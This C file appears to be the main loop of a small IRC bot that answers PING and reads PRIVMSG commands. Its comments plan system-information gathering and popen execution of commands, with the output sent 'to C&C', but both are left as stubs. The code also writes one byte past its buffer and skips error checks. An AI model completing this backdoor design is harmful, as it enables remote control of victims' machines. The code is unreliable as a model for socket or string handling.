/*	et_main_loop.c
	Author: William Woodruff
	------------------------
	The primary function used by et to send/receive data.
*/

#include <string.h>
#include <stdio.h>

void et_main_loop(int socket)
{
	char buf[1024];

	while(1)
	{
		recv(socket, buf, 1023, 0);
		buf[1024] = '\0';

		char *pping;
		if ((pping = strstr(buf, "PING")) && !(strstr(buf, "CASEMAPPING")))
		{
			strncpy(pping, "PONG", 4);
			send(socket, pping, strlen(pping), 0);
			printf("%s\n", pping);
		}
		else if (strstr(buf, "PRIVMSG"))
		{
			char *line = strtok(buf, "\r\n");
			char *message = strrchr(line, ':');
			message++;

			if (!strcmp(message, "quit"))
			{
				break;
			}
			else if (!strcmp(message, "info"))
			{
				// get system information here
			}
			else
			{
				// popen and write the output to C&C
			}
		}
	}
}